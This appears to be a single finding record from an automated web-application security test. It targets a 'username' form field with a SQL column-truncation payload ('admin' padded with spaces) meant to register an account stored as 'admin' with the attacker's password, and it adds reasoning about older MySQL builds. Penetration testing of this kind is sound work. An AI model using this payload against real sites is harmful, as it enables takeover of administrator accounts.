Target parameter(s): username (form body)

{"vuln_class": "sqli", "target_param": "username", "payload": "admin [30 spaces] a", "injection_point": "body", "expected_success_signal": "Account stored as 'admin' with the attacker's password (legacy versions error out instead)", "confidence": 0.5, "reasoning": "The truncation attack pads past the column length so the uniqueness check sees the long value but storage truncates to 'admin'; the README notes modern MySQL rejects over-length inserts, so success implies an old build."}
